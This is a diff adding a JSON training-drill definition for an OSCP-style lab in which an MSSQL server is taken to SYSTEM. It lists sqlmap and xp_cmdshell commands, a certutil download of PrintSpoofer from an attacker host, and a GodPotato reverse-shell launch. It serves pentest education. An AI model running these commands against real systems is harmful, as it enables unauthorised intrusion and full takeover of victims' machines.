@@ -1,0 +1,134 @@
+{
+  "id": "mssql-from-query-to-system",
+  "title": "MSSQL: From Query to SYSTEM",
+  "category": "service-drill",
+  "source": ["Medtech", "OSCP B", "Tally"],
+  "designed_by": "ai-composite",
+  "description": "Single-machine MSSQL drill: SQLi or auth → stacked queries → xp_cmdshell enable → reverse shell → SeImpersonate → PrintSpoofer/GodPotato → SYSTEM. Covers impacket-mssqlclient, sqlmap, manual UNION/stacked, xp_cmdshell, PrintSpoofer, GodPotato.",
+  "introduction": "This scenario drills the MSSQL-to-SYSTEM path: enable xp_cmdshell, get shell, then Potato. High-frequency OSCP pattern when MSSQL or SQLi is present.",
+  "mental_model": "MSSQL as mssql$ = often SeImpersonate. Enable xp_cmdshell, download/execute rev shell, then PrintSpoofer/GodPotato. Stacked queries for SQLi.",
+  "key_principles": [
+    "sp_configure show advanced + xp_cmdshell enable",
+    "xp_cmdshell runs as mssql$ (often has SeImpersonate)",
+    "certutil or powershell to download rev shell",
+    "PrintSpoofer/GodPotato for SeImpersonate → SYSTEM",
+    "sqlmap --os-shell for SQLi to xp_cmdshell"
+  ],
+
+  "indicators": {
+    "difficulty": 5,
+    "cognitive_load": 3,
+    "enumeration_depth": 3,
+    "rabbit_hole_risk": 2,
+    "time_pressure": 3
+  },
+
+  "mitre": {
+    "tactics": ["TA0003", "TA0004", "TA0006"],
+    "techniques": [
+      {"id": "T1190", "name": "Exploit Public-Facing Application"},
+      {"id": "T1059.001", "name": "PowerShell"},
+      {"id": "T1134.001", "name": "Token Impersonation/Theft"},
+      {"id": "T1059.003", "name": "Windows Command Shell"}
+    ]
+  },
+
+  "kill_chain_phases": ["T1-Recon", "T2-Web-Access", "T3-NonWeb-Access", "T4b-Win-PrivEsc"],
+
+  "environment": {
+    "machine_count": 1,
+    "network_count": 1,
+    "os_distribution": {"windows": 1, "linux": 0},
+    "has_ad": false,
+    "has_pivoting": false,
+    "has_client_side": false
+  },
+
+  "technique_tags": [
+    "mssql", "impacket-mssqlclient", "sqlmap", "xp_cmdshell",
+    "printspoofer", "godpotato", "seimpersonate", "sqli",
+    "stacked-queries", "union-injection"
+  ],
+
+  "exam_relevance": {
+    "oscp_exam_format": false,
+    "pen200_modules": [6, 12, 16, 17],
+    "pattern_frequency": "high",
+    "recommended_order": 3
+  },
+
+  "prerequisites": [],
+  "builds_on": [],
+
+  "networks": [
+    {"id": "external", "cidr": "10.10.10.0/24", "label": "External"}
+  ],
+
+  "machines": [
+    {
+      "id": "mssql-target",
+      "label": "MSSQL-TARGET",
+      "ip": "10.10.10.100",
+      "os": "Windows",
+      "role": "Standalone",
+      "networks": ["external"],
+      "services": [
+        {
+          "port": 1433,
+          "name": "MSSQL",
+          "version": "2019",
+          "vulnerabilities": [
+            {"type": "auth", "summary": "MSSQL with sa or weak creds", "leads_to": "xp_cmdshell"},
+            {"type": "sqli", "summary": "Web app SQLi → stacked queries → xp_cmdshell", "leads_to": "xp_cmdshell"}
+          ],
+          "commands": [
+            "impacket-mssqlclient sa:'<password>'@10.10.10.100",
+            "sqlmap -u 'http://10.10.10.100/login?id=1' --batch --risk=3 --level=5",
+            "sqlmap -u 'http://10.10.10.100/login?id=1' --os-shell",
+            {"cmd": "EXEC sp_configure 'show advanced options', 1; RECONFIGURE;", "rationale": "Why: Must enable advanced options before xp_cmdshell"},
+            {"cmd": "EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;", "rationale": "Why: xp_cmdshell gives OS command execution as mssql$"},
+            "EXEC xp_cmdshell 'whoami';"
+          ]
+        },
+        {
+          "port": 80,
+          "name": "HTTP",
+          "version": "IIS",
+          "vulnerabilities": [
+            {"type": "sqli", "summary": "Login form SQLi → UNION/stacked injection", "leads_to": "mssql-access"}
+          ],
+          "commands": [
+            "sqlmap -u 'http://10.10.10.100/login' --data 'user=admin&pass=1' --batch",
+            "--os-cmd='whoami'"
+          ]
+        }
+      ],
+      "privesc": [
+        {
+          "from": "mssql$",
+          "to": "SYSTEM",
+          "technique": "SeImpersonate → PrintSpoofer / GodPotato",
+          "commands": [
+            {"cmd": "EXEC xp_cmdshell 'certutil -urlcache -split -f http://<kali-ip>/PrintSpoofer64.exe c:\\windows\\temp\\p.exe';", "rationale": "Why: Download Potato via xp_cmdshell for privesc"},
+            {"cmd": "EXEC xp_cmdshell 'c:\\windows\\temp\\p.exe -i -c cmd';", "rationale": "Why: PrintSpoofer abuses SeImpersonate for SYSTEM"},
+            "./GodPotato-NET4.exe -cmd \"cmd /c c:\\windows\\temp\\reverse-shell.exe\""
+          ]
+        }
+      ],
+      "credentials": [],
+      "alternatives": []
+    }
+  ],
+
+  "connections": [],
+
+  "attack_paths": [
+    {
+      "id": "path-mssql",
+      "name": "MSSQL → xp_cmdshell → Potato → SYSTEM",
+      "color": "#6bb8cc",
+      "steps": ["mssql-target"],
+      "description": "SQLi/auth → stacked queries → xp_cmdshell enable → reverse shell → SeImpersonate → PrintSpoofer/GodPotato → SYSTEM"
+    }
+  ]
+}
